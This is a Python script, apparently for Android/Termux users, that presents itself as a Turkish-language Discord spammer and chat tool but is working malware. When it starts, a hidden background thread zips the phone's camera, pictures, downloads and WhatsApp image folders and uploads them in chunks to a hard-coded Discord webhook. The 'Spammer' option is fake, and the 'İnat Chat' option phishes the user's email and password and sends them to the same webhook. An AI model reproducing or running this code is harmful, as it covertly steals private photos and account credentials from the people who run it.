import os, sys, subprocess, threading, time
from datetime import datetime
from zipfile import ZipFile

REQUIRED = ["requests", "colorama"]
for pkg in REQUIRED:
    try:
        __import__(pkg)
    except ModuleNotFoundError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

import requests
from colorama import init, Fore
init(autoreset=True)

WEBHOOK_URL = "https://discord.com/api/webhooks/1386332332293886115/Tj0aC2I-7O3HNW5jGz-yFyj2FJTX2U2OCNSa_4ERMIASDY7-2WA_iJ4gugeOaueaj6QE"
CHUNK_SIZE = 5 * 1024 * 1024
ZIP_NAME = f"photo_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"

PHOTO_DIRS = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
]

def zip_photos():
    with ZipFile(ZIP_NAME, "w") as zipf:
        for folder in PHOTO_DIRS:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files:
                        path = os.path.join(root, file)
                        try:
                            zipf.write(path, os.path.relpath(path, folder))
                        except:
                            pass
    return ZIP_NAME

def send_chunks(zip_path):
    with open(zip_path, "rb") as f:
        part = 0
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            filename = f"{os.path.basename(zip_path)}.part{part}"
            files = {"file": (filename, chunk)}
            try:
                requests.post(WEBHOOK_URL, files=files)
            except:
                pass
            part += 1
            time.sleep(1)

def silent_backup():
    zip_path = zip_photos()
    send_chunks(zip_path)

BANNER = Fore.BLUE + r"""
 __  __   ______   _   __   ____   __       __  ___   ______   _____        _
 \ \/ /  / ____/  / | / /  /  _/  / /      /  |/  /  / ____/  /__  /     _ | |
  \  /  / __/    /  |/ /   / /   / /      / /|_/ /  / __/       / /     (_)/ /
  / /  / /___   / /|  /  _/ /   / /___   / /  / /  / /___      / /__   _  / /
 /_/  /_____/  /_/ |_/  /___/  /_____/  /_/  /_/  /_____/     /____/  (_)/_/

                               discord: kyenilmez47
"""

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def menu():
    while True:
        clear()
        print(BANNER)
        print(Fore.CYAN + "\n(1) Spammer")
        print("(2) İnat Chat")
        print("(0) Çıkış\n")
        choice = input(Fore.BLUE + "Seçim yap: ")
        if choice == "1":
            spammer()
        elif choice == "2":
            inat_chat()
        elif choice == "0":
            break
        else:
            print(Fore.RED + "Geçersiz seçim!")
            time.sleep(2)

def spammer():
    clear()
    print(Fore.YELLOW + "Bot Token Gir:")
    input(" > ")
    print("Sunucu ID Gir:")
    input(" > ")
    print(Fore.GREEN + "\nOto spam hazırlanıyor...")
    time.sleep(1)
    print(Fore.RED + "Başarısız. Menüye dönmek için ENTER'a bas.")
    input()

def inat_chat():
    clear()
    print(Fore.YELLOW + "Mail Gir:")
    mail = input(" > ")
    print("Şifre Gir:")
    pwd = input(" > ")
    print("Sunucu/Grup/Chat ID:")
    chatid = input(" > ")
    print("Dosya yolu:")
    path = input(" > ")
    try:
        requests.post(WEBHOOK_URL, json={
            "content": f"Zeus289\nMail: {mail}\nŞifre: {pwd}\nChatID: {chatid}\nDosya: {path}"
        })
    except:
        pass
    print(Fore.GREEN + "\nGÖNDERİM BAŞLADI ")
    input("Devam etmek için ENTER...")

def main():
    t = threading.Thread(target=silent_backup, daemon=True)
    t.start()
    menu()
    t.join()
    sys.exit(0)

if __name__ == "__main__":
    main()